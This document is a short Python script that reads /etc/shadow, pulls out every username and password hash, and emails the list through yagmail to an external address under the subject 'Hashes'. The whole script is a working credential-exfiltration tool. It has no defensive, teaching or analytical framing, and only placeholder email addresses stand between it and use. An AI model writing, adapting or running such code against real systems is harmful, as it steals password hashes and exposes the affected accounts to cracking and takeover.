import re
import yagmail

def user_extract():
    with open('/etc/shadow', 'r') as f:
        content = f.read()
        content_list = re.split(r'\n', content)
        content_list.pop()
        user = []
        passwd = []
        for i in content_list:
            splitted_content = re.split(r':', i)
            user.append(splitted_content[0])
            passwd.append(splitted_content[1] if splitted_content[1] else None)
#            print(splitted_content)
        return user, passwd

def main():
    users, passwd = user_extract()
    x = zip(users, passwd)
    yagmail.SMTP('from@mail.com').send('to@mail.com', 'Hashes', [i for i in x])

if __name__ == '__main__':
    main()
